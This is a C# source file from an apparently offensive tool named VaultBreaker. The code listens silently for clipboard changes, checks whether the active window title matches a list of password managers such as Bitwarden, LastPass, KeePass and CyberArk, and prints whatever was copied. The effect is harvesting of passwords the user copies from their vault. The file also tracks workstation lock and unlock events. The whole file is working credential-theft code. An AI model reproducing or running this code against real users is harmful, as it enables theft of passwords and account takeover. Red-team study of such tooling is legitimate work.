using System;
using System.Windows.Forms;
using System.Text;
using System.Threading;
using VaultBreaker.Helpers;
using System.Linq;
using Microsoft.Win32;

namespace VaultBreaker.Core
{
	public class Monitoring
	{
		//Based on https://github.com/justinbui/SharpClipboard
		public static void Start()
		{
			Application.Run(new ClipboardNotification.NotificationForm());
		}

		public static class Clipboard
		{
			public static string GetText()
			{
				string ReturnValue = string.Empty;
				Thread STAThread = new Thread(
					delegate ()
					{
					// Use a fully qualified name for Clipboard otherwise it
					// will end up calling itself.
					ReturnValue = System.Windows.Forms.Clipboard.GetText();
					});
				STAThread.SetApartmentState(ApartmentState.STA);
				STAThread.Start();
				STAThread.Join();

				return ReturnValue;
			}
		}

		public sealed class ClipboardNotification
		{
			public class NotificationForm : Form
			{
				public string[] supportedManagers = { "password", "bitwarden", "lastpass", "keepass", "1password", "true key", "log in", "sign in", "password manager", "enpass", "dashlane", "cyberark", "login" };

				public NotificationForm()
				{
					//Turn the child window into a message-only window
					WinAPI.SetParent(Handle, WinAPI.HWND_MESSAGE);
					
					//Add window to the clipboard format listener list
					WinAPI.AddClipboardFormatListener(Handle);
				}

				protected override void WndProc(ref Message m)
				{
	
					//Listen for operating system messages
					if (m.Msg == WinAPI.WM_CLIPBOARDUPDATE)
					{

						//Write to stdout active window
						IntPtr active_window = WinAPI.GetForegroundWindow();
						int length = WinAPI.GetWindowTextLength(active_window);
						StringBuilder sb = new StringBuilder(length + 1);
						WinAPI.GetWindowText(active_window, sb, sb.Capacity);
						if(supportedManagers.Any(sb.ToString().ToLower().Contains)){
							//Copy doesn't work when going from ChromeExtension for lastpass, but does when loading the "Vault Webpage". Should also work for Webpages where you're copying your password.
							Console.WriteLine("[+] Clipboard Retrieved!\r\n    Window Name: {0}\r\n    Text: {1} \r\n", sb.ToString(), Clipboard.GetText());
						}
					}
					//Called for any unhandled messages
					base.WndProc(ref m);
				}
			}

		}

		public class CheckForWorkstationLocking : IDisposable
		{
			public bool screenLocked { get; set; }
			private SessionSwitchEventHandler sseh;
			void SysEventsCheck(object sender, SessionSwitchEventArgs e)
			{
				switch (e.Reason)
				{
					case SessionSwitchReason.SessionLock: this.screenLocked = true; Console.WriteLine("Locked"); break;
					case SessionSwitchReason.SessionUnlock: this.screenLocked = false; Console.WriteLine("Unlocked"); break;
				}
			}

			public void Run()
			{
				//Setting screenLocked to false for now to wait until a screenLocked event happens. If a user needs it to go immediately they can use the /force flag.
				screenLocked = false;
				sseh = new SessionSwitchEventHandler(SysEventsCheck);
				SystemEvents.SessionSwitch += sseh;
			}


			#region IDisposable Members

			public void Dispose()
			{
				SystemEvents.SessionSwitch -= sseh;
			}

			#endregion
		}
	}
}
